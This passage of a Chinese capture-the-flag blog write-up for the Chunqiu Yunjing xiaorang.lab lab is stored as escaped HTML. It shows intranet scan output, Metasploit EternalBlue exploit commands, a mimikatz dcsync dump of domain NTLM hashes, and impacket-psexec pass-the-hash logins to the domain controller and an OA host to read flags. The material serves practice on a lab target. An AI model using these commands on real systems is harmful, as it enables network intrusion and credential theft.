长度:5578   标题:Bootstrap Material Admin</span><br><span class=\"line\">[2025-04-18 20:15:54] [INFO] 系统信息 172.22.1.2 [Windows Server 2016 Datacenter 14393]</span><br><span class=\"line\">[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.2      DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class=\"line\">[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class=\"line\">[2025-04-18 20:15:54] [SUCCESS] 发现漏洞 172.22.1.21 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010</span><br><span class=\"line\">[2025-04-18 20:15:54] [SUCCESS] 网站标题 http://172.22.1.18        状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.1.18?m=login</span><br><span class=\"line\">[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class=\"line\">[2025-04-18 20:15:55] [SUCCESS] 网站标题 http://172.22.1.18?m=login 状态码:200 长度:4012   标题:信呼协同办公系统</span><br><span class=\"line\">[2025-04-18 20:15:55] [SUCCESS] 目标: http://172.22.1.15:80</span><br><span class=\"line\">  漏洞类型: poc-yaml-thinkphp5023-method-rce</span><br><span class=\"line\">  漏洞名称: poc1</span><br><span class=\"line\">  详细信息:</span><br><span class=\"line\">        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</span><br></pre></td></tr></table></figure>\n\n<p> 172.22.1.21 有永恒之蓝，上msf梭哈</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 msfconsole</span><br><span class=\"line\">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class=\"line\">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class=\"line\">set RHOSTS 172.22.1.21</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure>\n\n<p>收集一些域内哈希</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">meterpreter &gt; load kiwi</span><br><span class=\"line\">meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br><span class=\"line\">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class=\"line\">[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server</span><br><span class=\"line\">[DC] Exporting domain &#x27;xiaorang.lab&#x27;</span><br><span class=\"line\">[rpc] Service  : ldap</span><br><span class=\"line\">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class=\"line\">502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514</span><br><span class=\"line\">1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512</span><br><span class=\"line\">1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512</span><br><span class=\"line\">1000    DC01$   09bb349ab17bbe480b91eb20bb204bee        532480</span><br><span class=\"line\">500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512</span><br><span class=\"line\">1104    XIAORANG-OA01$  25e4b9f501c8831b0568fcc61e4ddc7f        4096</span><br><span class=\"line\">1108    XIAORANG-WIN7$  acf1bc550440e81c9f2663ff304b4ab3        4096</span><br></pre></td></tr></table></figure>\n\n<p>有域控的哈希了直接打域控，然后就可以为所欲为了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-psexec  -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/Administrator@172.22.1.2 -codec gbk</span><br><span class=\"line\">C:\\Users\\Administrator\\flag&gt; type flag03.txt</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-psexec  -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/Administrator@172.22.1.18 -codec gbk</span><br><span class=\"line\">C:\\Users\\Administrator\\flag&gt; type flag02.txt</span><br></pre></td></tr></table></figure>\n\n<h1 id><a href=\"#\" class=\"headerlink\" title></a></h1><p>看别人的wp，好像是要先打172.22.1.18，是一个OA系统可以打nday一把梭，我就不看了</p>\n","categories":["春秋云镜"],"tags":["靶机"]}]